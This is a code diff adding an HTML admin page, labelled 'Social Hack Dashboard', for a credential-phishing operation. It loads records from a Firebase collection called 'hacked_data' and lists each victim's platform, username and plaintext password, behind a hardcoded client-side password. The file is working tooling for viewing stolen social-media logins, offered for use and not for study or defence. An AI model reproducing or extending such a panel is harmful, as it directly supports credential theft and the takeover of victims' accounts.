@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="module" src="firebase-config.js"></script>
+</head>
+<body>
+
+    <div class="container" id="login-box">
+        <h1>Admin Panel 🔒</h1>
+        <input type="password" id="admin-pass" placeholder="Enter Password">
+        <button onclick="checkPass()">Login</button>
+    </div>
+
+    <div class="container" id="dashboard-container" style="display:none;">
+        <h1>Social Hack Dashboard 📊</h1>
+        <p class="developer">Nawab Zada Hacker</p>
+        
+        <table class="data-table">
+            <thead>
+                <tr>
+                    <th>Platform</th>
+                    <th>User</th>
+                    <th>Password</th>
+                    <th>Time</th>
+                </tr>
+            </thead>
+            <tbody id="data-body">
+            </tbody>
+        </table>
+    </div>
+
+    <script type="module">
+        import { db, collection, getDocs } from './firebase-config.js';
+
+        window.checkPass = function() {
+            const pass = document.getElementById('admin-pass').value;
+            // Set your master password here
+            if(pass === "NawabZada123") { 
+                document.getElementById('login-box').style.display = 'none';
+                document.getElementById('dashboard-container').style.display = 'block';
+                fetchAllData();
+            } else {
+                alert("Wrong Password!");
+            }
+        }
+
+        async function fetchAllData() {
+            const querySnapshot = await getDocs(collection(db, "hacked_data"));
+            const tbody = document.getElementById('data-body');
+            tbody.innerHTML = ""; // Clear old data
+
+            querySnapshot.forEach((doc) => {
+                const data = doc.data();
+                const date = data.timestamp.toDate().toLocaleTimeString();
+                
+                let row = `<tr>
+                    <td style="color:#00ffcc">${data.platform}</td>
+                    <td>${data.username}</td>
+                    <td>${data.password}</td>
+                    <td>${date}</td>
+                </tr>`;
+                tbody.innerHTML += row;
+            });
+        }
+    </script>
+</body>
+</html>
